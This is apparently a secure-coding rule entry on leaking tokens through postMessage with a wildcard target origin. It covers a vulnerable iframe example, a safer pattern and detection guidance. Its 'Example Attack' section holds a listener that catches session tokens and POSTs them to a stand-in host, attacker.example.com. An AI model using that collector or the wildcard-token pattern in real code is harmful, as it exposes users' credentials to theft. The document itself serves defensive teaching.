---
id: WOF-SDE-002
title: "Sensitive Data to `postMessage` Wildcard Target Origin"
kind: vulnerability
default_severity: high
exploitability: medium
standards:
  cwe:
    - CWE-201
  owasp_top_10:
    - "A01:2025 Broken Access Control"
platforms:
  - browser
languages:
  - html
  - javascript
  - typescript
detection:
  type: semantic-pattern
  methods:
    - grep
    - ast
    - semantic-review
  candidate_tokens:
    - postMessage(
    - targetOrigin
    - contentWindow
    - window.open(
    - accessToken
indicators:
  - calls to `postMessage` that send tokens, session data, personal data, or bootstrap secrets into another window
  - wildcard or overly broad `targetOrigin` values such as `*` for data that should only reach one trusted origin
  - popup or iframe integrations where the receiving window can be navigated before sensitive data is sent
  - cross-origin bootstrap flows that expose reusable credentials instead of a one-time transfer artifact
tags:
  - sensitive-data-exposure
  - postmessage
  - target-origin
  - token-leak
  - iframe
  - popup
  - cross-origin
---

## Rule

When sending sensitive data with `window.postMessage`, set `targetOrigin` to the exact trusted origin that should receive it.
Using `*` or another overly broad value allows whatever origin currently occupies the target window to receive the message.

## Mental Model

`targetOrigin` is browser-enforced recipient access control.
If you pass `*`, you disable that protection and rely on hope that the popup or iframe still points at the page you intended.
The bug is not `postMessage` itself.
The bug is sending secrets without binding delivery to one specific origin.

## Why This Matters

Popups and iframes are navigable.
OAuth bridges, embedded widgets, account-linking flows, and internal admin tools often move session bootstrap data, access tokens, CSRF nonces, or private profile fields across window boundaries.
If the receiving window is redirected, replaced, or navigated to attacker-controlled content before the message is sent, a wildcard `targetOrigin` turns that navigation into a secret leak.

## Vulnerable Pattern

```html
<iframe id="bridge-frame" src="https://login.example.com/bridge"></iframe>

<script>
  const bridgeFrame = document.getElementById("bridge-frame");

  async function sendSessionBootstrap() {
    const response = await fetch("/api/session/bootstrap", {
      credentials: "include",
    });
    const bootstrap = await response.json();

    // Problem: "*" allows whatever origin is currently loaded in the iframe
    // to receive the sensitive bootstrap payload.
    bridgeFrame.contentWindow.postMessage(
      {
        type: "session-bootstrap",
        accessToken: bootstrap.accessToken,
        refreshToken: bootstrap.refreshToken,
        email: bootstrap.email,
      },
      "*",
    );
  }

  setTimeout(() => {
    void sendSessionBootstrap();
  }, 1500);
</script>
```

## Example Attack

If the iframe or popup is navigated to attacker-controlled content before the message is sent, the attacker only needs to wait for the wildcard delivery.

```html
<!-- Origin: https://attacker.example.com/collector -->
<script>
  window.addEventListener("message", async (event) => {
    if (event.data?.type !== "session-bootstrap") {
      return;
    }

    await fetch("https://attacker.example.com/store", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify(event.data),
    });
  });
</script>
```

## Why The Attack Works

1. The sender packages reusable sensitive data into a `postMessage` payload.
2. The sender uses `*` instead of an exact trusted `targetOrigin`.
3. The receiving window can be navigated to a different origin before the send occurs.
4. The browser delivers the message to the attacker-controlled origin now occupying that window.
5. The attacker reuses the stolen token, secret, or personal data outside the original workflow.

## Safer Pattern

Bind the message to one exact origin, verify the expected sender window during the readiness handshake, and avoid sending long-lived secrets when a one-time transfer code will do.

```html
<iframe id="bridge-frame" src="https://login.example.com/bridge"></iframe>

<script>
  const bridgeFrame = document.getElementById("bridge-frame");
  const bridgeOrigin = "https://login.example.com";

  async function sendTransferCode() {
    const response = await fetch("/api/session/transfer-code", {
      credentials: "include",
    });
    const { transferCode } = await response.json();

    bridgeFrame.contentWindow.postMessage(
      {
        type: "session-transfer",
        transferCode,
      },
      bridgeOrigin,
    );
  }

  window.addEventListener("message", (event) => {
    if (event.origin !== bridgeOrigin) {
      return;
    }

    if (event.source !== bridgeFrame.contentWindow) {
      return;
    }

    if (event.data?.type === "bridge-ready") {
      void sendTransferCode();
    }
  });
</script>
```

An exact `targetOrigin` means the browser will refuse delivery if the iframe or popup is no longer on the expected origin.
That protection is stronger than application-level guessing after the secret has already been sent.
When possible, send a short-lived one-time code and make the trusted receiver exchange it server-side instead of exposing raw access or refresh tokens to browser JavaScript.

## Detection

Detection type: `semantic-pattern`.

- Candidate collection: search for `postMessage` calls on `Window`, `contentWindow`, popup references from `window.open`, and wrapper APIs that delegate to those primitives.
- High-confidence candidates use `*`, set `targetOrigin` to a broad computed value, or otherwise send sensitive payloads without a single exact trusted origin string.
- Confirmation: inspect the message payload for tokens, session identifiers, personal data, signed URLs, bootstrap secrets, or private account state.
- Review the receiver lifecycle, not just the call site: redirects, open redirects, tab-nabbing style navigation, compromised third-party widgets, and delayed sends all matter.
- A scanner should surface the wildcard send; the agent or reviewer should confirm that the message contents are sensitive and that another origin could realistically occupy the target window before delivery.

## False Positives

- `postMessage(..., "*")` is not automatically a vulnerability when the payload is intentionally public, non-sensitive, and does not trigger privileged behavior.
- Layout notifications, resize events, or generic ready-state signals can be acceptable with `*` if they contain no secrets and no sensitive identifiers.
- A send that uses an exact allowlisted origin string and avoids exposing reusable secrets is usually not this issue.

## Scope Notes

Some browser scenarios involving opaque origins require `*` for delivery.
That is exactly why sensitive data should not be sent over those channels.
If the message is worth protecting, choose a channel and payload design that can be pinned to one trusted origin or reduced to a one-time, low-value artifact.

## References

- [MITRE CWE-201: Insertion of Sensitive Information Into Sent Data](https://cwe.mitre.org/data/definitions/201.html)
- [OWASP Top 10 2025 A01: Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN: `Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

## Quick Checklist

- Every `postMessage` carrying sensitive data uses one exact trusted `targetOrigin`.
- `*` is reserved for messages that are intentionally public and contain no secrets or private identifiers.
- Popups and iframes prove readiness from the expected `origin` and expected `source` before bootstrap data is sent.
- Prefer one-time transfer codes or server-mediated fetches over raw long-lived tokens in browser messages.
- Security review considers whether redirects or navigation changes can swap the receiver origin before delivery.
